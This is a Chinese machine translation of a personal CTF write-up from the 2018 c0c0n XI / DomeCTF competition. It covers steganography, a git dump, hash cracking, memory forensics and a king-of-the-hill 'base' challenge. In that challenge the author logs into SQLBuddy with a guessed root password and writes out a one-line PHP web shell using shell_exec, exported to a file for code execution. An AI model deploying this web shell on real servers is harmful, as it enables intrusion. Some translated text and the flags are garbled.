<html>
<head>
<title>c0c0n XI CTF Writeup</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Xi·CTF报道</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/c0c0n-xi-ctf-writeup-875a15d2df69?source=collection_archive---------0-----------------------#2018-10-06">https://infosecwriteups.com/c0c0n-xi-ctf-writeup-875a15d2df69?source=collection_archive---------0-----------------------#2018-10-06</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/5bc67176c34e85936d0982ed5102edf4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*o0wc7SxIFKVquI0Q.jpg"/></div></div></figure><h1 id="2f9e" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">关于XI</h1><p id="c1e3" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">c0c0n是一年一度的国际网络安全、数据隐私和黑客会议，由国际公私合作组织主办，由网络空间治安协会(POLCYB)牵头，与信息安全研究协会(ISRA)、技术公司集团(GTec)和喀拉拉邦IT Mission联合举办。</p><h1 id="77e0" class="jy jz iq bd ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv bi translated">夺旗</h1><p id="0267" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">这次夺旗比赛由<a class="ae lu" href="https://www.appfabs.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="ky ir"> AppFabs </strong> </a> <strong class="ky ir"> </strong>和<a class="ae lu" href="http://www.cyberdome.kerala.gov.in/" rel="noopener ugc nofollow" target="_blank"> <strong class="ky ir">喀拉拉邦警方Cyberdome </strong> </a> <strong class="ky ir">组织。</strong></p><h2 id="f757" class="lv jz iq bd ka lw lx dn ke ly lz dp ki lh ma mb km ll mc md kq lp me mf ku mg bi translated">登记</h2><p id="4ed6" class="pw-post-body-paragraph kw kx iq ky b kz la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt ij bi translated">注册非常简单，因为组织者记下了我们的名字和联系方式，给了我们规则和在CTF平台验证注册所需的哈希码，以及一个非常酷的徽章</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mh"><img src="../Images/b0981e2793fca2c73c4f9cdc3bebd3f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*RYpMp-0aHRwIxXM681_iQA.jpeg"/></div></div></figure><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mm"><img src="../Images/af886dc3aa297ea44afd5f92a1819f87.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YBIGMa8slHfJKdWx9zR3aA.png"/></div></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">平台界面</figcaption></figure><p id="7669" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">每队由2名队员组成，平台提供基于网络、加密、取证、杂项的挑战。</p><p id="004c" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">比赛于2018年5月10日上午10点开始，当时约有35支队伍注册了比赛。唷，这是我第二次参加CTF比赛，人真多，</p><h2 id="3fd0" class="lv jz iq bd ka lw lx dn ke ly lz dp ki lh ma mb km ll mc md kq lp me mf ku mg bi translated"><strong class="ak">挑战</strong></h2><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi mw"><img src="../Images/08001e53c31e725a585232ee2209079d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1272/format:webp/1*weLhyw6RLXmeQ4tEXLbqmQ.png"/></div></figure><p id="9fb5" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">在这个文件中，我们有一个包含一些内容的zip文件，我们提取该文件并找到3个图像文件，</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/a80d0fe24209c815e1198d1f584eac4e.png" data-original-src="https://miro.medium.com/v2/resize:fit:570/format:webp/1*nKU4mE5VKqd6Q2MAVgaXAw.png"/></div></figure><p id="6dea" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">通过运行字符串，在文件中嵌入了一个txt文件。使用binwalk我们提取了文件，旗帜被一分为三并嵌入到图像中</p><p id="54a5" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated"><strong class="ky ir">domectf { vuotdsj 1 b 7 pw 6 xueuu 9 RFP 9 ufrn 3g 6 vk }</strong>还有就是这个标志</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi my"><img src="../Images/6030499633765074288c3c12ca8f5bfb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/format:webp/1*vTTT0_T7Tf_o5yjfDIu4JQ.png"/></div></figure><p id="f49c" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">这是一个指向登录页面的网络挑战</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mz"><img src="../Images/64f2f6dd95e96e92a1f48794b146d95b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0GW4GwOqOtBxZ9lNMnEJ2Q.png"/></div></div></figure><p id="fc53" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">当我的队友在登录中寻找问题时，我在url上运行了一个dirb，返回了一些好的东西</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi na"><img src="../Images/899644b627489db4add23c0c0a68dff1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cW753iBZUT8DYuQkblEa5A.png"/></div></div></figure><p id="949b" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">。所以我们尝试用gitdumper来转储git目录的内容</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nb"><img src="../Images/b16f45f0bb2e1e1ca641748305a4531a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Vvoe7LuHZtRh-Uhzk0zMDQ.png"/></div></div></figure><p id="89bc" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">我做的第一件事是检查提交日志，但组织者通过更改头来增加难度，这返回了一个错误，尽管我试图纠正错误，但我失败了Hmmm可以做什么，有一个名为gitextractor的工具，它扫描git目录并从提交中提取文件</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nc"><img src="../Images/27f68750f22cdf2c87bdbe11d96a0fda.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YVcQNsLFQO-MIKYMAE-lcw.png"/></div></div></figure><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nd"><img src="../Images/1c73b4dc9752b07d1f2450ff3ff1f357.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DnX0BF9CsXqgNG2BIYEXKg.png"/></div></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">旗</figcaption></figure><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/dad6ffd6590c445729c2801f379e0894.png" data-original-src="https://miro.medium.com/v2/resize:fit:1264/format:webp/1*rR82bMlETT8Evw8HvnpswQ.png"/></div></figure><p id="5dd0" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">这个挑战提供了一大串数据(Base64 ),经过多次编码和解码，我们得到了一个不寻常的东西</p><p id="57e1" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated"><strong class="ky ir">$ 9 $ gquqatohsetz 6 atuhcvwlnyohqfqf 6 ctrv 8 xbwq。pqnc 1 rskwxtuyewldvftz 9 tyrv 8 x-tuk w8 LBW . MF 56 cres rem 5 qlv 7 bwqz 3 nporhyrvl 7-PQF/OB</strong></p><p id="ebe8" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">我们检查了hashcat示例，它返回了CISCO hash</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/1b5c9710e74cd38d69e71535e3eaa915.png" data-original-src="https://miro.medium.com/v2/resize:fit:1356/format:webp/1*xfgCd6hI4Dkf7wVHP_AJmw.png"/></div></figure><p id="6d2c" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">那不是大麻，是杜松大麻</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mm"><img src="../Images/50889d35838488165a9b30f45909c731.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pYwmBDZkkbeFyd1mFoti2Q.png"/></div></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">哈哈，这花了一些时间</figcaption></figure><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/c4136dc4765946ab243cd36dafd4b11d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1274/format:webp/1*Ysmm29ZE7v7a21TLEUW1YQ.png"/></div></figure><p id="8123" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">这个挑战有一个密码保护的pdf文件，我们必须找到它的密码，我们尝试了pdfcrack和我们武器库中的各种工具，但没有有效的密码，为了改变我们尝试了CTF的名字(domectf ),每个解决它的人都应该面对自己</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nh"><img src="../Images/6c9a6bf09c8a5bd4750e53de37f2d1c7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*O40B9TP_7kj43sUVAhR5Kw.png"/></div></div></figure><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi mw"><img src="../Images/7c5be788ee5a305b71e063f66ecfd4fc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1272/format:webp/1*twkJJAfN2kg_oOXZVeonyQ.png"/></div></figure><p id="9b71" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">这个挑战非常有趣，因为挑战类型显示为“base ”,我们所要做的就是执行代码，将团队名称写入/tmp/DOMECTF_BASE，并防止其他团队知道它，当正确完成时，团队每5分钟左右获得1分(如果我错了，请纠正我)+200分的基础分</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ni"><img src="../Images/ea52df5fd79f00caf4ffb5c85a3d50f7.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*1wE3RNiS0uKavTiNjv0j7Q.png"/></div></div></figure><p id="358b" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">尝试了dirb和其他工具没有什么有趣的时间来启动BURP套件，我对它运行了蜘蛛，它找到了一个登录到SQLBUDDY(凌晨2点@晚上)</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nj"><img src="../Images/5f05e9530511c0925db2dd6eb7ca0561.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*b6X1XqIlIJiddfrnbEVCig.png"/></div></div></figure><p id="5bdb" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">用户名是根和密码，我们不得不猜测，并找到了密码，即密码XD有效登录</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nk"><img src="../Images/1376e07f3835cfbf39e9ba9c0e6e8e92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*vxkkSvMrPvPBUmsh8V8IWQ.png"/></div></div></figure><p id="7574" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">现在我们可以执行代码了，但是我们遇到了一些问题。经过几个小时的思考，我们发现组织者阻塞了一些功能，比如system。唯一通过的是exec和shell_exec</p><p id="5b5a" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">我们创建了一个数据库和一个插入了<strong class="ky ir">和&lt;的表？php echo shell_exec($_GET['e']。2&gt;&amp;1’)；？&gt; </strong>作为值，文本作为数据类型，现在要得到一个shell，我们需要做的就是将它导出到一个php文件中</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi nl"><img src="../Images/540b6edb95cbb4111518e327b56f54ec.png" data-original-src="https://miro.medium.com/v2/resize:fit:902/format:webp/1*0HHPlFieAPVaORtGGNRAMA.png"/></div></figure><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nm"><img src="../Images/a3107950fd942529b47fc102f9f49397.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Z0OqWAVqUpybStMS9zGLCw.png"/></div></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">代码执行</figcaption></figure><p id="eb61" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">我们将我们的团队名称写入DOMECTF_BASE文件，现在我们必须保护它，所以我写了一些蹩脚的代码，自动登录到SQLBUDDY，创建数据库并完成其余的事情，虽然我的代码在几个方面失败了，但正是sreehari的技能让我们保护了基地，</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/2490bdcd411bfa264a7bdb48d4167c3b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1274/format:webp/1*HfKh_SatlCQDdjthrFtvWg.png"/></div></figure><p id="95c0" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">这个挑战非常令人沮丧，因为链接指向一个大约300MB的7z文件。问题是在活动中有太多的网络问题，我花了3次尝试才完成下载</p><p id="8e67" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">根据我在hackthebox中玩CTFs的经验，我立刻知道这是一个内存转储，所以我们需要从中提取数据，所以我使用了一个名为foremost的工具，这是一个取证工具</p><p id="19c2" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">转储了大量的数据</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nn"><img src="../Images/9cf2eab3e095436ae53c37a773bda7d1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7lNge6hnx71SaMO5kVvygQ.png"/></div></div></figure><p id="ed4f" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">在提取的数据中搜索包含受密码保护的标志的zip文件</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div class="gh gi no"><img src="../Images/90ace766a28c2c7a06462030004b01cf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1368/format:webp/1*JA1DTE4fSsqnvf2wKU6PrA.png"/></div></figure><p id="0753" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">在之前的截图中，很明显内存来自windows机器。现在为了找到密码，我们用不同的单词列表尝试fcrackzip，但没有给我们密码，所以我确信密码一定在内存转储中，因为这是我第一次使用volatility</p><p id="d320" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">首先，我们必须弄清楚内存转储属于哪个版本的Windows</p><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/276ba9c246e26eda306624f1e9865979.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nNYIXUdkZMpmF_iIEsxd_A.png"/></div></div></figure><figure class="mi mj mk ml gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi nq"><img src="../Images/74076f974d6b6805ffe79edd6b65ef92.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_LDG1RtcHtK5rx3m6M0wqg.png"/></div></div><figcaption class="mn mo gj gh gi mp mq bd b be z dk translated">这是压缩文件的密码</figcaption></figure><p id="9985" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated"><strong class="ky ir">domectf { ilko 4k ckg 6 bo 4 qttnm 7 GM 4g R1 qhmdwun }</strong>当我们认为比赛已经结束的时候:(但是我们获得了第四名，这一点也不差，与50支队伍竞争，最终获得第四名是一个不小的成就。</p><p id="8fc7" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated"><strong class="ky ir">这些是我们团队已经解决的挑战，还有更多人将尝试完成剩下的挑战</strong></p><p id="fad7" class="pw-post-body-paragraph kw kx iq ky b kz mr lb lc ld ms lf lg lh mt lj lk ll mu ln lo lp mv lr ls lt ij bi translated">感谢我的队友<strong class="ky ir"> Sreehari </strong>在很多方面帮助了我，感谢团队<strong class="ky ir"> AppFabs </strong>，祝贺<strong class="ky ir"> RedX </strong>、<strong class="ky ir"> RedRaptor </strong>和<strong class="ky ir"> 0x00sec </strong>获得第一、第二和第三名，我还要感谢<a class="ae lu" href="https://www.netobjex.com/" rel="noopener ugc nofollow" target="_blank"> <strong class="ky ir"> NetObjex </strong> </a>赞助了这场比赛的门票，让我的梦想变成了现实</p></div></div>    
</body>
</html>